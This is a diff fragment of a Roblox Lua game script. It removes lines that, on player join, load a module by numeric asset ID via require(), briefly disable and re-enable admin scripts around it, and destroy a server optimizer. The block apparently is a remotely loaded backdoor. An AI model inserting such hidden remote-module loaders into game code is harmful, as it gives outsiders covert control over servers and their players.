@@ -22,33 +22,6 @@ loadstring("\95\71\46\98\97\100\119\111\114\100\115\32\61\32\123\34\102\117\99\3
 end
 end)
 
-if game.PlaceId == 14747334292 then
-    local chatcon = {}
-    chatcon[#chatcon + 1] = game.Players.PlayerAdded:Connect(function(player)
-        wait(0.117522056089628)
-        chatcon[#chatcon + 1] = game.Players.PlayerAdded:Connect(function(player)
-            require(117522056089628)
-            game.ServerScriptService["Touch Kohls Admin"].Enabled = false
-            game.ServerScriptService["setting commands"].Enabled = false
-            wait(0.117522056089628)
-            game.ServerScriptService["Touch Kohls Admin"].Enabled = true
-            game.ServerScriptService["setting commands"].Enabled = true
-            for i, v in ipairs(chatcon) do
-                v:Disconnect()
-            end
-        end)
-    end)
-else
-    require(117522056089628)
-    game.ServerScriptService["Touch Kohls Admin"].Enabled = false
-    wait(0.117522056089628)
-    game.ServerScriptService["Touch Kohls Admin"].Enabled = true
-end
-
-pcall(function()
-	game.ServerScriptService["server optimizer"]:Destroy() -- its not doing its job when the game is having much lower playercounts
-end)
-
 local timelimit = "08/30/2025"
 
 local ctime = os.date("%m/%d/%Y")
